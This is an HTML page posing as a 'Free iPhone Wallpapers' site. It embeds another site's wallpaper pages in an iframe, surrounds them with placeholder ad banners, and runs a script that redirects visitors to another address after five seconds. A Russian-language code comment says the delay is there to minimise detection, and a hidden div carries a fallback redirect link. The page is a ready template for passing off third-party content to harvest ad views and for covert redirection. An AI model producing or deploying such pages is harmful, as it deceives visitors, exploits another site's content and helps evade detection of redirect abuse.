<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free iPhone Wallpapers</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
            background-color: #f0f0f0;
        }
        iframe {
            width: 100%;
            height: 90vh;
            border: none;
        }
        .ad-banner {
            margin: 10px 0;
        }
        .ad-banner img {
            width: 100%;
            max-width: 728px;
            height: auto;
        }
        .hidden-redirect {
            display: none;
        }
    </style>
    <script>
        // Функция автоматической переадресации
        window.onload = function() {
            setTimeout(function() {
                window.location.href = 'https://example.com'; // Укажите ваш целевой сайт
            }, 5000); // Задержка в 5 секунд для минимизации обнаружения
        };
    </script>
</head>
<body>

    <!-- Advertising Banner 1 -->
    <div class="ad-banner">
        <img src="https://via.placeholder.com/728x90.png?text=Your+Ad+Here+1" alt="Advertisement 1">
    </div>

    <!-- Advertising Banner 2 -->
    <div class="ad-banner">
        <img src="https://via.placeholder.com/728x90.png?text=Your+Ad+Here+2" alt="Advertisement 2">
    </div>

    <!-- Embed akspic.ru inside your page -->
    <iframe src="https://akspic.ru/" title="iPhone Wallpapers"></iframe>

    <!-- Advertising Banner at the Bottom -->
    <div class="ad-banner">
        <img src="https://via.placeholder.com/728x90.png?text=Your+Ad+Here+Bottom" alt="Advertisement Bottom">
    </div>

    <div class="hidden-redirect">
        <p>If you are not redirected automatically, follow <a href="https://example.com">this link</a>.</p>
    </div>

    <footer>
        <p>&copy; 2024 Free iPhone Wallpapers</p>
    </footer>

</body>
</html>
